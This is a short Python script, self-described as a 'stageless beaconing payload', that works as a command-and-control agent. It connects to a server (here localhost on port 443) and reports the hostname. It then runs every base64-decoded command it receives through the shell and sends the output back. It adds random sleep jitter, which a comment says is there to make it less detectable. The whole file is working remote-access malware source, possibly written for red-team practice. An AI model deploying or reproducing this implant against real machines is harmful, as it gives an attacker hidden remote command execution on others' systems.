import socket
import time
import os
import random
import base64

# Stageless Beaconing Payload (contains full Agent)

HOST, PORT = "localhost", 443
command = "hostname"
data = os.popen(command).read()
min, max = 1, 5
Loop = True

while(Loop):

    # Create a TCP socket 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        sock.sendall(bytes(data + "\n", "utf-8"))

        # Receive data from the server
        received = str(sock.recv(2048), "utf-8")
        
        # Decode data
        received = base64.b64decode(received).decode("utf-8")

        # Exit the loop if exit is received from the server
        if received == "exit":
            Loop = False
        elif received == "INTERVAL":
            min = int(str(sock.recv(1024), "utf-8"))
            max = int(str(sock.recv(1024), "utf-8"))
            time.sleep(random.randint(min,max))
        elif received == "PING":
            command = "ping -t 8.8.8.8"
            os.system(command)
            Loop = False
        else:
            # run the command and save the output
            c2command = os.popen(received).read()
            sock.sendall(bytes(c2command + "\n", "utf-8"))

            # Add jitter to make it less detectable
            time.sleep(random.randint(min,max))

